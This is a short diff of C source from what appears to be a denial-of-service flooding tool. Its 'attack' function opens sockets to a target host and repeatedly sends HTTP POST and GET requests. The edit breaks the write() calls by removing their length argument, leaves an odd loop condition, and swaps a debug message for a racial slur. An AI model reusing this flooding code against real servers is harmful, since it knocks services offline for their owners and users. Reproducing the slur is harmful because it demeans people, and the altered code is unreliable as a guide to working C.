@@ -60,12 +60,12 @@ void attack(char *host, char *port, int id) {
 		for(x=0; bytes < 0; x++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
-			r=write(sockets[x], "POST / HTTP/1.1\r\n\r\n", 1);
-			if(r == -1) {
-				r=write(sockets[x], "GET / HTTP/1.1\r\n\r\n", 1);
-				sockets[x] = make_socket(host, port);
+			r=write(sockets[x], "POST / HTTP/1.1\r\n\r\n");
+			if(bytes < 0) {
+				write(sockets[x], "GET / HTTP/1.1\r\n\r\n");
+				
 			} else
-				fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
+				fprintf(stderr, "Niggers\n");
 			fprintf(stderr, "[%i: Voly Sent]\n", id);
 		}
 		
